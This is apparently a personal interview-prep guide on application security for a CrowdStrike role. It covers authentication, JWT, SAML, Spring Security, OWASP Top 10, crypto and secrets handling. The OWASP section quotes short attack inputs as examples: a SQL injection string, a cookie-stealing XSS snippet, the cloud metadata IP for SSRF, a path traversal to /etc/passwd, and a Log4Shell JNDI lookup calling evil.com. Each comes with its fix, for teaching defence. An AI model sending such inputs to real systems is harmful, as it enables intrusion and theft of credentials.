# Security — One-File Guide for CrowdStrike 🛡️

> Built from your notes (`spring-boot/06-security-jwt.md`, `03-rest-api-exceptions.md`, `07-microservices.md`, `09-tricky-questions`, `backend-interview-refresher.md`, `core-java/03`) **plus** the security topics CrowdStrike interviewers like (OWASP, crypto, SAML, secrets, container/cloud security) and **your real work stories**.
>
> Format per topic: **Say this** (30-sec answer) · 🌍 **Example** · **Most asked** · **Trap**

**Contents**
1. Your security stories (start here)
2. AuthN vs AuthZ, 401 vs 403
3. Passwords & hashing
4. Sessions vs JWT, refresh tokens, revocation
5. OAuth2, OIDC, SAML (SSO)
6. Spring Security in 1 page
7. CORS vs CSRF
8. OWASP Top 10 — the attacks
9. Crypto basics (hashing vs encryption vs encoding, TLS)
10. Secrets management
11. API security checklist + rate limiting
12. Secure Java coding
13. Container, Kubernetes & cloud security
14. What CrowdStrike does (domain basics)
15. Rapid fire + night-before revision

---

## 1. Your security stories ⭐ (use these — they're real)

| Story | What to say (short) | LP / signal |
|---|---|---|
| **SAML SSO migration** | "I moved our SAML single sign-on and 8 login endpoints from old Java servlets to Spring Boot controllers, keeping responses identical, and fixed SSO issues." | ownership, careful change |
| **Security hotspots (51)** | "In a SonarQube cleanup I fixed 51 security hotspots: a ReDoS-prone regex, 42 `printStackTrace` calls leaking stack traces (moved to proper logging), world-readable permissions on upload folders and SFTP credential files, and an insecure temp file." | Dive Deep, high standards |
| **ReDoS fix** | "A regex `(\d+)$` parsed tenant ids from input. Some inputs can make regexes backtrack for a very long time and freeze a thread. I replaced it with a simple loop from the end of the string — linear time." | concrete technical fix |
| **Multi-pod session bug** | "Login tokens were cached in each server's memory, so a login on one pod failed on another. Sessions are now stored centrally; we're moving that store to Redis." | distributed-systems + security |
| **Hardening review (what I'd fix)** | "I found containers running as root, credentials as plain values in deployment files, a cloud key committed in a repo, and tokens generated with `Math.random()`. Fixes: non-root containers, a secret manager, rotate the key, Workload Identity, `SecureRandom`, AES-GCM." | security mindset |

🗣️ **One-liner for "Any security experience?"**
> "Yes — I've worked on SAML single sign-on and session handling, and fixed security findings in our Java backend like ReDoS, information leakage through stack traces and unsafe file permissions. I'm keen to go deeper into security, which is a big reason I'm interested in CrowdStrike."

⚠️ Say "I'd fix / I flagged" for the hardening items unless you actually raised or fixed them.

---

## 2. Authentication vs Authorization 🔥
**Say this:** "Authentication checks **who you are** — password, token, SSO. Authorization checks **what you're allowed to do** — roles, permissions. Authentication comes first. Failing authentication is **401**, being known but not allowed is **403**."

🌍 **Example:** at an office, the **ID card check at the gate** is authentication; the **card not opening the server room** is authorization.

| | Authentication | Authorization |
|---|---|---|
| Question | Who are you? | What can you do? |
| Based on | password, token, certificate | roles, scopes, ownership |
| Failure | **401 Unauthorized** | **403 Forbidden** |

**Most asked**
- **Role-based vs attribute-based?** RBAC = by role (ADMIN, USER). ABAC = by attributes (department, time, resource owner). 
- **What is IDOR?** User changes `/orders/123` to `/orders/124` and sees someone else's order → always check the **resource belongs to the user**, not just that they're logged in.

**Trap:** "Logged in" ≠ "allowed". Missing ownership checks is the #1 web vulnerability (Broken Access Control).

---

## 3. Passwords & hashing
**Say this:** "Never store passwords. Store a **slow, salted, one-way hash** — BCrypt, scrypt or Argon2 — and compare with the library's `matches()`."

🌍 **Example:** a fingerprint — you can check if a finger matches, but you can't rebuild the finger from the print.

**Key points**
- **Salt** = random value per password → same password gives different hashes → rainbow tables useless.
- **Slow by design** → brute force becomes expensive.
- Don't use MD5/SHA-1/plain SHA-256 for passwords (too fast).

**Most asked**
- **Why `char[]` for passwords in Java, not String?** A String stays in memory until garbage collected (maybe in the pool) and can appear in heap dumps; a `char[]` can be wiped right away: `Arrays.fill(pwd, '0')`.
- **Pepper?** A secret added to all passwords, stored outside the DB (e.g. in a vault).

**Trap:** Never compare hashes yourself with `equals` — use `encoder.matches(raw, hash)` (constant-time).

---

## 4. Sessions vs JWT, refresh tokens, revocation 🔥
**Say this:** "With **sessions**, the server stores login state and the client sends a session cookie. With **JWT**, the state is inside a signed token, so any server can verify it. JWT scales easily but is **hard to revoke** before it expires."

🌍 **Example:** session = a **coat-check ticket** (the cloakroom keeps your coat); JWT = a **signed concert wristband** (any guard can check it, but you can't take it back until the event ends).

| | Session | JWT |
|---|---|---|
| State | server | in the token |
| Sent as | cookie (`JSESSIONID`) | `Authorization: Bearer` header |
| Scaling | needs shared store (Redis) | easy |
| Logout | easy — delete it | hard — valid until expiry |
| CSRF risk | yes (cookies auto-sent) | no (if in header) |

**JWT basics:** `header.payload.signature`, Base64URL. **Signed, not encrypted** — anyone can read the payload, so **no secrets inside**.

**Access + refresh tokens:** access = short (5–15 min), sent on every call; refresh = long, used only at `/auth/refresh`, stored server-side so it can be revoked.

**How to revoke / logout a JWT**
1. Short-lived access tokens.
2. Delete the refresh token on logout.
3. Blacklist the token id (`jti`) in Redis with TTL = remaining lifetime.

**HS256 vs RS256:** HS256 = one shared secret signs and verifies (every verifier can also forge). RS256 = private key signs, **public key verifies** (published as JWKS) → better for many services.

**Most asked**
- **Where to store JWT in a browser?** `HttpOnly` + `Secure` + `SameSite` cookie protects from XSS stealing it (then add CSRF protection); localStorage is readable by any injected script.
- **`alg: none` attack?** Some old libraries accepted unsigned tokens → always fix the allowed algorithm on the server.

🔗 **Your link:** "Our portal uses a server-side session key (`keyForAPI`) stored centrally, which we can revoke instantly — that's the session model. Our team's MCP server uses short-lived RS256 JWTs that carry only a session id, and the middleware also checks the session exists, so logout revokes immediately."

---

## 5. OAuth2, OIDC, SAML (SSO)
**Say this:** "**OAuth2** is delegated **authorization** — an app gets limited access to your data without your password ('Login with Google'). **OIDC** adds **identity** on top with an ID token (a JWT). **SAML** is an older XML-based standard for **enterprise single sign-on**."

🌍 **Example:** OAuth2 = a **valet key** — the valet can drive your car but can't open the boot. SSO = one office ID card that opens every building on campus.

| | OAuth2 | OIDC | SAML |
|---|---|---|---|
| Purpose | authorization | authentication (identity) | enterprise SSO |
| Format | access tokens (often JWT) | ID token (JWT) | XML assertion |
| Typical use | APIs, mobile, third-party access | "Login with Google" | company login to internal apps |

**OAuth2 roles:** Resource Owner (user) · Client (app) · Authorization Server (issues tokens) · Resource Server (API).

**PKCE** (for mobile/CLI apps that can't keep a secret): the app sends a hash of a random value at the start and the original at the end → a stolen auth code is useless.

**SAML flow (your real one):**
```
User → our app → redirect to company IdP → user logs in
IdP → signed XML assertion → our app validates:
   ✔ signature  ✔ issuer  ✔ time window (NotBefore/NotOnOrAfter + small clock skew)
→ one-time code → session created
```
**Most asked**
- **What do you validate in a SAML response?** Signature (response and assertion), issuer, status, audience, time window, one-time use (replay).
- **SAML vs OIDC?** Same goal (SSO); OIDC is JSON/JWT and works better for APIs and mobile.

---

## 6. Spring Security in 1 page 🔥
**Say this:** "Spring Security is a **chain of filters** that run before the controller. For login, `AuthenticationManager` → provider → `UserDetailsService` loads the user → `PasswordEncoder` checks the password → the result goes into `SecurityContextHolder`. In Boot 3 we define a `SecurityFilterChain` bean."

```
Request → DelegatingFilterProxy → FilterChainProxy → SecurityFilterChain
            CORS → CSRF → JwtFilter/login filter → ExceptionTranslation (401/403) → Authorization
        → DispatcherServlet → Controller
```
```java
@Bean
SecurityFilterChain chain(HttpSecurity http) throws Exception {
    return http.csrf(c -> c.disable())                       // stateless JWT API only
        .authorizeHttpRequests(a -> a.requestMatchers("/auth/**").permitAll()
                                     .requestMatchers("/admin/**").hasRole("ADMIN")
                                     .anyRequest().authenticated())
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
        .build();
}
```
**Most asked**
- Current user? `SecurityContextHolder.getContext().getAuthentication()` (ThreadLocal).
- Method level? `@EnableMethodSecurity` + `@PreAuthorize("hasRole('ADMIN')")` — works via proxy, so **self-calls skip the check**.
- `hasRole('X')` = `hasAuthority('ROLE_X')`.

**Traps**
- Filter exceptions are **not** handled by `@ControllerAdvice` → use `AuthenticationEntryPoint` (401) / `AccessDeniedHandler` (403).
- Forgetting `chain.doFilter()` in your filter blocks all requests.
- Matchers are checked top to bottom — specific first, `anyRequest()` last.

---

## 7. CORS vs CSRF 🔥
**Say this:** "**CORS** is a browser rule for which websites may call your API from JavaScript. **CSRF** is an attack where an evil site makes your browser send a request **with your cookies**."

🌍 **CSRF example:** you're logged in to your bank; a malicious page has a hidden form that posts "transfer ₹10,000" to the bank — your browser attaches your bank cookie automatically.

| | CORS | CSRF |
|---|---|---|
| What | browser permission for cross-origin calls | attack using auto-sent cookies |
| Protects server? | **No** — browser-only | protection = CSRF token / SameSite cookies |

**Disable CSRF only** when auth is a header token (no cookies).

---

## 8. OWASP Top 10 — the attacks (very likely at CrowdStrike)
| Attack | Simple meaning | 🌍 Example | Fix |
|---|---|---|---|
| **Broken access control / IDOR** | user reaches data they shouldn't | change `/orders/123` → `/124` | ownership checks on every request, deny by default |
| **SQL injection** | input becomes part of a query | login with `' OR '1'='1` | **parameterized queries** / JPA, never string-concatenate SQL |
| **XSS** | attacker's script runs in another user's browser | a comment containing `<script>steal(cookie)</script>` | escape output, Content-Security-Policy, `HttpOnly` cookies |
| **SSRF** | server is tricked into calling internal URLs | "fetch image from URL" → `http://169.254.169.254` (cloud metadata with credentials) | allow-list destinations, block internal IP ranges |
| **Insecure deserialization** | crafted bytes run code when deserialized | Java `ObjectInputStream` on untrusted data | don't deserialize untrusted input; use JSON with a fixed schema |
| **Security misconfiguration** | default passwords, debug on, open buckets | public S3 bucket with customer data | hardened defaults, config scanning |
| **Vulnerable components** | old library with a known CVE | Log4Shell (Log4j 2021) | dependency scanning, patch fast |
| **Cryptographic failures** | weak/no encryption | passwords hashed with MD5 | TLS everywhere, strong algorithms |
| **Auth failures** | weak login | no rate limit → password guessing | MFA, rate limiting, lockout |
| **Logging & monitoring failures** | attacks go unnoticed | no alerts on 1,000 failed logins | security logging + alerts (this is CrowdStrike's world) |

**Also know**
- **ReDoS** — a regex that takes exponential time on crafted input → thread freezes (your fix!).
- **Path traversal** — `../../etc/passwd` in a filename → normalize and validate paths.
- **Command injection** — user input passed to a shell → never build shell commands from input.

**Log4Shell in one breath:** "Log4j would look up `${jndi:ldap://evil.com/x}` inside logged text and load remote code. Anyone who could get a string logged — like a User-Agent header — could take over the server. Fix: upgrade, disable lookups, and block outbound LDAP."

---

## 9. Crypto basics
**Say this:** "**Encoding** changes format (Base64) — no security. **Hashing** is one-way — for integrity and passwords. **Encryption** is two-way with a key — for confidentiality. **Signing** proves who sent it and that it wasn't changed."

| | Reversible? | Needs a key? | Use | Example |
|---|---|---|---|---|
| Encoding | yes, by anyone | no | transport format | Base64 (JWT payload) |
| Hashing | no | no (HMAC uses one) | integrity, passwords | SHA-256, BCrypt |
| Symmetric encryption | yes | same key both sides | bulk data | AES |
| Asymmetric encryption | yes | public/private pair | key exchange, signatures | RSA, ECC |

🌍 **Symmetric** = one house key copied for both people. **Asymmetric** = a **mailbox**: anyone can drop a letter in (public key), only the owner can open it (private key).

**Key points**
- Prefer **AES-GCM** (encrypts **and** detects tampering) over AES-CBC; use a **random IV every time**.
- Random tokens → `SecureRandom`, never `Math.random()`.
- **HMAC** = hash + secret key → proves the message came from someone with the key.

🔗 **Your link:** "Our legacy login encryption used AES-CBC with the IV derived from the salt and PBKDF2-SHA1, and tokens from `Math.random()`. SonarQube flagged it; the fix is AES-GCM with random IVs, a stronger KDF, and `SecureRandom`."

### TLS / HTTPS
- **Say this:** "TLS proves the server's identity with a certificate and encrypts traffic. The handshake uses **asymmetric** crypto to agree on a key, then data uses fast **symmetric** encryption."
- **mTLS** = **both** sides show certificates → used between microservices (zero trust).
- **TLS termination** = decrypt at the load balancer; for zero trust, re-encrypt inside.
- Why not asymmetric for everything? Too slow.

---

## 10. Secrets management
**Say this:** "Secrets — DB passwords, API keys, signing keys — must never be in code, images or git. Store them in a **secret manager**, inject at runtime, give least-privilege access, and **rotate** them."

🌍 **Example:** don't tape the office safe code under the desk — keep it in a locked key box with a log of who opened it.

**Key points**
- Tools: HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, K8s Secrets (**only base64** → enable encryption at rest).
- Cloud workloads: use **identity, not keys** — IRSA (AWS EKS) / Workload Identity (GKE).
- **If a secret leaks:** rotate immediately, revoke the old one, check audit logs for misuse, remove it from git history, add secret scanning (e.g. gitleaks) to CI.

🔗 **Your link:** "I noticed a cloud service-account key committed to one of our repos and DB credentials as plain env values. The right fix is rotate the key, use Workload Identity so no key file exists, and move credentials to a secret manager."

---

## 11. API security checklist + rate limiting
**"How do you secure an API?" — say this list:**
1. **HTTPS** only.
2. **Authentication** — OAuth2/JWT, short-lived access tokens + refresh.
3. **Authorization** — roles/scopes **and ownership checks**.
4. **Input validation** — `@Valid`, allow-lists, size limits.
5. **No injection** — parameterized queries.
6. **Rate limiting** — per user/IP/API key → `429` + `Retry-After`.
7. **Return DTOs, not entities** — don't leak `password`/internal fields; prevents over-posting (`"role":"ADMIN"`).
8. **Safe errors** — no stack traces to the client (your 42 `printStackTrace` fixes!).
9. **Strict CORS**, secrets in a vault, security headers.
10. **Logging + monitoring** of auth failures and unusual traffic.

**Rate limiting algorithms (from your notes)**
| Algorithm | Simple idea | Note |
|---|---|---|
| **Token bucket** | tokens refill steadily; each request spends one | allows short bursts — most common |
| Leaky bucket | requests leave at a fixed rate | smooth, no bursts |
| Fixed window | count per minute | double burst at window edges |
| Sliding window | weighted current + previous window | accurate, cheap |
Distributed → counters in **Redis** (`INCR` + `EXPIRE`, or Lua for atomicity). Put it at the **API gateway** + inside services.

**Idempotency** (security + reliability): client sends `Idempotency-Key`; server stores key + result → retries don't double-charge.

---

## 12. Secure Java coding
| Topic | Rule |
|---|---|
| Strings are immutable | good for security — validated paths/URLs can't change later |
| Passwords | `char[]`, wipe after use |
| Serialization | avoid Java native deserialization of untrusted data; use JSON |
| Reflection | `setAccessible(true)` breaks encapsulation — be careful with untrusted class names |
| Resources | try-with-resources (prevents leaks/DoS) — part of your 65 bug fixes |
| Logging | never log passwords/tokens; use SLF4J, not `printStackTrace` |
| Regex | avoid nested quantifiers on user input (ReDoS) |
| Randomness | `SecureRandom` for tokens/IDs |
| Files | validate paths (no `../`), restrictive permissions (no world-readable) — your fix |
| Dependencies | scan for CVEs (OWASP Dependency-Check, Snyk); update fast |

---

## 13. Container, Kubernetes & cloud security (short — details in `Kubernetes and Docker/` guide)
| Layer | Do this |
|---|---|
| **Image** | small base image, scan for CVEs in CI, no secrets inside, sign images |
| **Container** | run as **non-root**, read-only filesystem, drop Linux capabilities, never `privileged` |
| **Kubernetes** | RBAC least privilege, NetworkPolicies (default deny), encrypt Secrets, admission policies (block root/unsigned images), audit logs |
| **Runtime** | detect unusual behaviour in running containers — a shell spawned, a crypto-miner — **this is what CrowdStrike's sensors do** |
| **Cloud** | **shared responsibility** (provider secures infra, you secure config/data/IAM), least-privilege IAM, MFA, no public buckets, roles instead of keys |

🌍 **Shared responsibility:** renting a flat — the landlord secures the building; you lock your own door.

---

## 14. What CrowdStrike does — domain basics (so you sound informed)
| Term | Simple meaning |
|---|---|
| **Endpoint** | any device: laptop, server, phone, cloud VM |
| **EDR** (Endpoint Detection & Response) | an agent on each device records activity (processes, files, network) and detects attacks, then helps respond (isolate the machine, kill the process) |
| **XDR** | EDR extended across endpoints, cloud, identity, email |
| **Falcon platform** | CrowdStrike's cloud-native platform; a **lightweight sensor** on each machine streams events to the cloud for analysis |
| **Threat intelligence** | knowledge about attacker groups and their techniques |
| **IOC vs IOA** | Indicator of Compromise = evidence after the fact (a known bad file hash); Indicator of Attack = suspicious *behaviour* in progress (Word spawning PowerShell) |
| **MITRE ATT&CK** | a public catalogue of attacker techniques (credential dumping, lateral movement…) |
| **Zero trust** | never trust by network location; verify every user, device and request |
| **SIEM** | collects and searches security logs from everywhere |
| **Ransomware** | malware that encrypts files and demands payment |
| **Lateral movement** | attacker hops from one compromised machine to others |
| **Kernel / eBPF sensor** | sensors run close to the OS kernel to see everything with low overhead |

🗣️ **Why this connects to you:**
> "Falcon's backend is essentially a huge real-time event pipeline — sensors stream events, the cloud ingests, enriches and analyses them at massive scale. That's very close to what I do: high-throughput services, Kafka pipelines, caching and reliability under spikes."

**July 2024 outage** (a faulty sensor content update crashed many Windows machines): answer calmly → "It showed how important staged rollouts, testing and fast rollback are, especially for software running in the kernel."

---

## 15. Rapid fire
| Q | A |
|---|---|
| 401 vs 403? | not authenticated vs not allowed |
| Is JWT encrypted? | no — signed; payload readable |
| Why BCrypt? | salted, slow, one-way |
| Hashing vs encryption? | one-way vs reversible with a key |
| Symmetric vs asymmetric? | one shared key vs public/private pair |
| How to prevent SQL injection? | parameterized queries |
| XSS fix? | escape output, CSP, HttpOnly cookies |
| CSRF fix? | CSRF token, SameSite cookies; not needed for header tokens |
| CORS protects the server? | no — browser rule only |
| What's PKCE? | protects OAuth code flow for apps without a secret |
| SAML vs OIDC? | XML enterprise SSO vs JSON/JWT on OAuth2 |
| mTLS? | both client and server present certificates |
| SSRF target in cloud? | metadata endpoint `169.254.169.254` |
| Secret leaked? | rotate, revoke, audit, purge history, add scanning |
| Least privilege? | only the permissions needed, nothing more |
| Defense in depth? | multiple layers so one failure isn't a breach |
| Log4Shell? | JNDI lookup in logged text → remote code execution |
| ReDoS? | regex with catastrophic backtracking freezes threads |

## 📌 Night-before revision (10 lines)
1. AuthN = who (401), AuthZ = what (403); always check **ownership** (IDOR).
2. Passwords → BCrypt/Argon2, never plain/MD5; `char[]` in Java.
3. Session = server state, easy revoke; JWT = signed token, scale easily, revoke via short expiry + refresh + blacklist.
4. OAuth2 = authorization, OIDC = identity, SAML = enterprise SSO (validate signature, issuer, time, replay).
5. Spring Security = filter chain → `SecurityFilterChain`; `@PreAuthorize`; filter errors need `AuthenticationEntryPoint`.
6. CORS = browser permission; CSRF = cookie attack.
7. OWASP: access control, injection, XSS, SSRF, deserialization, misconfig, vulnerable libs.
8. Crypto: encode ≠ hash ≠ encrypt; AES-GCM + random IV; `SecureRandom`; TLS = asymmetric handshake + symmetric data.
9. Secrets → vault/secret manager, identities not keys, rotate on leak.
10. Containers: non-root, scan, no secrets, NetworkPolicy, RBAC; runtime detection = CrowdStrike's job.
